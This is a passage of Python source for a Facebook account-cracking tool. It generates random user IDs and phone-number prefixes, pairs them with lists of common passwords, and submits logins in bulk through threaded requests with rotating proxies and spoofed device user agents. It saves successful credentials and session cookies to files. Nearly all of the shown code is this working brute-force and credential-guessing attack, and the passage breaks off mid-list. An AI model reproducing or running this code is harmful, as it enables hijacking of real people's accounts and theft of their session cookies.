        jalan('\033[1;92mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
        for love in user:
            pwx = ['fitiavana123','Fitiavana','Rijade123','Malagasy','Rakoto123','Zanako123','12345678']
            uid = code+love
            for Shuvo in HamiiID:
                pwx.append(Shuvo)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
###############################################
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
lin= 40* '-'


#############
######################
# APK CHECK
def mahdi_MHS():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    Mahdi_Hasan(logo)    
    code = '1000000'
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    passx = 0
    MHS = []
    Mahdi_Hasan("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        MHS.append(pww)
    with ThreadPool(max_workers=60) as manshera:
        clear()
        tl = str(len(user))
        jalan('     \033[1;92mM  \033[1;91mA  \033[1;93mH  \033[1;94mD  \033[1;95mI  \033[1;97m-  \033[1;92mT  \033[1;91mO  \033[1;93mO  \033[1;94mL  \033[1;95mS  \033[1;97m-  \033[1;92mF  \033[1;93mI  \033[1;94mR  \033[1;95mE')
        jalan('\033[1;92mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        Mahdi_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        jalan('\033[1;92mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
        for love in user:
            pwx = ['123456','1234567','12345678','11112222','123123','123456@','123456789','@1234@','500600','693049']
            uid = code+love
            for Shuvo in MHS:
                pwx.append(Shuvo)
                pwx.append(love)
            manshera.submit(mahdiold,uid,pwx,tl)
    print(f"\n{x} â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")



def  mahdi_userNAME():
    user=[]
    twf =[]

    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    Mahdi_Hasan(" â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")        
    rk1 = ''
    rk2 = '.'
    code = random.choice([rk1,rk2])            
    # input(f' [{xr}â– {x}] Choose : ')
    os.system('clear')
    Mahdi_Hasan(logo)
    fastname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93mmahdi, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING FAST USER NAME:\033[0;93m ')
    os.system('clear')
    Mahdi_Hasan(logo)
    lasttname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93mmahdi, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LAST USER NAME:\033[0;93m ')
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        m = random.choice([1,2,3,0,4])
        nmp = ''.join(random.choice(string.digits) for _ in range(m))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan("")
    passx = int(input('pass limite:'))
    HamiiID =[]
    for bilal in range(passx):
        pww = input("[*] Enter Password : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=40) as manshera:
        clear()
        tl = str(len(user))
        jalan('     \033[1;92mM  \033[1;91mA  \033[1;93mH  \033[1;94mD  \033[1;95mI  \033[1;97m-  \033[1;92mT  \033[1;91mO  \033[1;93mO  \033[1;94mL  \033[1;95mS  \033[1;97m-  \033[1;92mF  \033[1;93mI  \033[1;94mR  \033[1;95mE')
        Mahdi_Hasan('\033[1;97mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        Mahdi_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        Mahdi_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        Mahdi_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        Mahdi_Hasan(f'{x}[{xr}^{x}]\033[0;92m YOU INPU NAME :'+fastname+lasttname)
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSlow Cloning')
        Mahdi_Hasan('\033[1;97mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
        for love in user:
            m1= fastname+code+love
            m2 = fastname+code+lasttname+love
            mahdinn = random.choice([m1,m2])
            mahdiuser = mahdinn
            pwx = [fastname+lasttname,fastname+lasttname+love,fastname+love,lasttname+love,'ff lover',fastname+'123',lasttname+'123',fastname+lasttname +'123',fastname+lasttname +'1234',fastname+'1234',fastname+'1122']
            uid = mahdiuser
            for Shuvo in HamiiID:
                pwx.append(Shuvo)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")

def mahdi_afg():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    Mahdi_Hasan(" â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
    rk1 = '9370'
    rk2 = '9379'
    rk3 = '9378'
    rk4 = '9377'
    rk5 = '9374'
    code = random.choice([rk1,rk2,rk3,rk4,rk5])                      # input(f' [{xr}â– {x}] Choose : ')
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    passx = 0
    HamiiID = []
    Mahdi_Hasan("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=40) as manshera:
        clear()
        tl = str(len(user))
        jalan('     \033[1;92mM  \033[1;91mA  \033[1;93mH  \033[1;94mD  \033[1;95mI  \033[1;97m-  \033[1;92mT  \033[1;91mO  \033[1;93mO  \033[1;94mL  \033[1;95mS  \033[1;97m-  \033[1;92mF  \033[1;93mI  \033[1;94mR  \033[1;95mE')
        jalan('\033[1;92mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        jalan('\033[1;92mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
        for love in user:
            pwx = [love[1:],love,love[2:],love+code,'afghan1234','afghan123','afghanistan','100200','500600','800900']
            uid = code+love
            for Shuvo in HamiiID:
                pwx.append(Shuvo)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•") 

####################################################################
def rcrack1(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            
            m = random.choice(my_color)
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            su = random.choice([m,k,xr,u,b])
            bi = random.choice([P,M,K,B,U,O,N,H])
            
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            params = {
			    'refsrc': 'deprecated',
			    'lwv': '100',
			    'ref': 'dbl',
			}
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
            "method": 'GET',
            "scheme": 'https',
            'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
   
    'origin': 'https://mbasic.facebook.com',
    'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
            'user-agent': ug}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,params=params,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\n\033[1;93m--------------[MAHDI-OKðŸ’¥]--------------\n\x1b[2;91mNUMBER/EMAILðŸ‘‰\033[2;32m:'+uid+'\n\x1b[1;95muidâž£\033[2;32m:'+cid+'\033[1;32m\033[33m   pass:\033[2;32m'+ps+'  \033[1;94m='+tahunng(cid)+'\n\x1b[0;38m[â€Žâ€ŽCOOKIE]= \033[1;32m'+coki+'\n\033[1;93m'+ug)
                cek_apk(session,coki)
                ma4D1('/sdcard/MDI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[MAHDI-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ma4D1('/sdcard/mm-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{bi}MAHDI{x}] [{m}{uid}{x}] _[%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass


def mahdiold(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            su = random.choice([m,k,xr,u,b])
            bi = random.choice([P,M,K,B,U,O,N,H])
            session = requests.Session()
            sys.stdout.write(f'\r\r%s{x}[{bi}MAHDI{x}] [{m}{uid}{x}] _[%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
               'authority': 'x.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                # 'cookie': 'sb=kRPRY45Ldv1SzIjqvuIIwbHP; datr=oxPRY9UBZC_y5Rjyj3mHzLFq; locale=en_GB; m_pixel_ratio=1; wd=1366x625; fr=0coIUb9tinAAoBzF5.AWWCo0q_ovTfWqvrghbDkUhQB6M.Bj2KMP.7f.AAA.0.0.Bj2KNP.AWXYU5zxFLE',
                'referer': 'https://x.facebook.com/',
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': pro,
            }
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\n\033[1;93m--------------[RONNY-OK]--------------\n\x1b[2;91mNUMBER/EMAILðŸ‘‰\033[2;32m:'+uid+'\n\x1b[1;95muidâž£\033[2;32m:'+cid+'\033[1;32m\033[33m   pass:\033[2;32m'+ps+'\n\x1b[0;38m[â€Žâ€ŽCOOKIE]= \033[1;32m'+coki+'\n\033[1;93m'+ug)
                cek_apk(session,coki)
                ma4D1('/sdcard/RONNY-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;0m[RONNY-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ma4D1('/sdcard/RONNY-CP.txt', 'a').write( uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{bi}[{xr}MAHDI{bi}]{bi}[{ox}%s|%s{bi}] [{xr}OK:{xr}%s{bi}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
##########################################################################
def file():
            os.system("clear")
            print(logo)
            cnt = input('PUT FILE NAME : ')
            id = open(cnt).read().splitlines()
            os.system("clear")
            print(logo)
            tl = len(id)
            print("\033[1;91m\rUSE FLIGHT (airplane) MODE ON\033[1;96m")
            print(50*"-")
            print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
            print('\033[1;36mTOTAL IDS : \033[2;92m%s ' % len(id))
            print('\033[1;33mCRACKING STARTED.....')
            print(50*"-")
            with ThreadPool(max_workers=50) as ssbworld:
                for zsb in id: 
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 5:
                            pwx = [name, xz[0]+"123",xz[0]+"1234",xz[0]+xz[1], xz[0]+"12345",name+'@123',xz[1]+'123',xz[0]+'@123']
                        else:
                            pwx = [name, xz[0]+"123",xz[0]+"1234",xz[0]+xz[1], xz[0]+"12345",name+'@123','112233',xz[0]+'@123']
                            pwx = ["786110",'@#@#@#','fflover','Fre Fire','freefire','l love you']
                        ssbworld.submit(rcrack,uid,pwx,tl)
                    except:
                        pass
#################################################################################
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 